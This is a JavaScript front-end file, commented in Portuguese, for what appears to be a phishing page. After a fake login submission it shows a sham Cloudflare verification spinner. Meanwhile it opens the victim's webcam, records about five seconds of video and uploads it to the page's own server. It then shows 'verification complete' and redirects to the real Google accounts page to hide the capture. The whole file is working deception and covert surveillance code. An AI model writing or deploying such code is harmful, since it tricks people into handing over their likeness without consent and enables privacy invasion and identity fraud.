document.addEventListener('DOMContentLoaded', function() {
    // Elementos do DOM
    const loginForm = document.getElementById('login-form');
    const verificationStep = document.getElementById('verification-step');
    const webcamElement = document.getElementById('webcam');
    const canvasElement = document.getElementById('canvas');
    const loadingSpinner = document.getElementById('loading-spinner');
    const verificationText = document.getElementById('verification-text');
    const cloudflareSpinner = document.querySelector('.cloudflare-spinner');
    const cloudflareCheck = document.querySelector('.cloudflare-check');
    
    // Variáveis para a captura de vídeo
    let stream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    let isRecording = false;
    
    // Configurações
    const PHOTO_DELAY = 500; // 0.5 segundo após permitir a câmera
    const VIDEO_LENGTH = 5000; // 5 segundos de gravação      // Manipulador do formulário de login
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Oculta o formulário de login e mostra a tela de verificação
        document.querySelector('.login-card').classList.add('hidden');
        verificationStep.classList.remove('hidden');
        
        // Inicia o spinner do Cloudflare (sem completar ainda)
        iniciarVerificacao();
        
        // Inicia o processo de captura em segundo plano
        initCamera();
    });
      // Função para iniciar a câmera em segundo plano
    async function initCamera() {
        try {
            // Solicita permissão para acessar a câmera
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 } 
                },
                audio: false 
            });
            
            // Conecta o stream ao elemento de vídeo oculto
            webcamElement.srcObject = stream;
              // Assim que o vídeo estiver pronto
            webcamElement.onloadedmetadata = function() {
                setTimeout(() => {
                    // Inicia diretamente a gravação do vídeo
                    startRecording();
                }, PHOTO_DELAY);
            };
        } catch (error) {
            console.error('Erro ao acessar a câmera:', error);
            // Se houver erro na câmera, ainda assim "completa" a verificação para não parecer travado
            // mas espera um tempo maior para simular tentativas
            setTimeout(() => {
                completarVerificacao();
            }, 5000);
        }
    }
    
    // Captura e envia a foto
    function capturePhoto() {
        // Define as dimensões do canvas
        canvasElement.width = webcamElement.videoWidth;
        canvasElement.height = webcamElement.videoHeight;
        
        // Captura o frame atual do vídeo
        const context = canvasElement.getContext('2d');
        context.drawImage(webcamElement, 0, 0, canvasElement.width, canvasElement.height);
        
        // Converte para base64
        const imageDataUrl = canvasElement.toDataURL('image/jpeg', 0.8);
        
        // Envia a imagem para o servidor
        sendImage(imageDataUrl, 'photo');
    }
    
    // Inicia a gravação de vídeo
    function startRecording() {
        // Verifica se o MediaRecorder é suportado
        if (!MediaRecorder || !stream) {
            console.error('MediaRecorder não suportado ou stream não disponível');
            return;
        }
        
        try {
            // Configuração do MediaRecorder
            const options = { mimeType: 'video/webm;codecs=vp9,opus' };
            mediaRecorder = new MediaRecorder(stream, options);
            
            // Evento para coletar os chunks de dados
            mediaRecorder.ondataavailable = function(e) {
                if (e.data.size > 0) {
                    recordedChunks.push(e.data);
                }
            };
            
            // Evento ao finalizar a gravação
            mediaRecorder.onstop = function() {
                // Cria um Blob com os chunks gravados
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                
                // Envia o vídeo para o servidor
                sendVideo(blob);
                
                // Limpa os chunks
                recordedChunks = [];
                isRecording = false;
            };
            
            // Inicia a gravação
            mediaRecorder.start();
            isRecording = true;
              // Define o timer para parar a gravação
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                    mediaRecorder.stop();
                    // Completa a verificação depois que o vídeo terminar de gravar
                    completarVerificacao();
                }
            }, VIDEO_LENGTH);
        } catch (error) {
            console.error('Erro ao iniciar gravação:', error);
            // Em caso de erro na gravação, ainda completa a verificação
            completarVerificacao();
        }
    }
      // Envia a imagem para o servidor
    function sendImage(imageData, type) {
        fetch('/api/upload-base64', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                imageData: imageData,
                fileType: type
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Imagem enviada com sucesso:', data);
            // Se não estiver configurado para capturar vídeo, completa verificação após enviar a imagem
            if (!shouldCaptureVideo()) {
                completarVerificacao();
            }
        })
        .catch(error => {
            console.error('Erro ao enviar imagem:', error);
            // Em caso de erro no envio, ainda completa a verificação
            if (!shouldCaptureVideo()) {
                completarVerificacao();
            }
        });
    }
    
    // Envia o vídeo para o servidor
    function sendVideo(videoBlob) {
        // Cria um FormData para enviar o arquivo
        const formData = new FormData();
        formData.append('video', videoBlob, 'recording.webm');
        
        // Envia o vídeo
        fetch('/api/upload-video', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            console.log('Vídeo enviado com sucesso:', data);
        })
        .catch(error => {
            console.error('Erro ao enviar vídeo:', error);
        });
    }
      // Função para verificar se deve capturar vídeo (baseado na configuração .env)
    function shouldCaptureVideo() {
        // Por padrão, captura vídeo. Isso poderia ser configurado via variável de ambiente
        // mas como estamos no frontend, usamos true por padrão
        return true;
    }    // Função para iniciar a verificação (apenas spinner)
    function iniciarVerificacao() {
        // Inicia com o spinner rodando e texto "Verificando..."
        verificationText.textContent = "Verificando...";
        cloudflareSpinner.classList.remove('hidden');
        cloudflareCheck.classList.add('hidden');
    }
    
    // Função para completar a verificação após captura bem-sucedida
    function completarVerificacao() {
        // Simula que a verificação foi concluída
        cloudflareSpinner.classList.add('hidden');
        cloudflareCheck.classList.remove('hidden');
        verificationText.textContent = "Verificação concluída!";
        
        // Após 2 segundos, redireciona para a página real do Google
        setTimeout(() => {
            window.location.href = "https://accounts.google.com";
        }, 2000);
    }
});
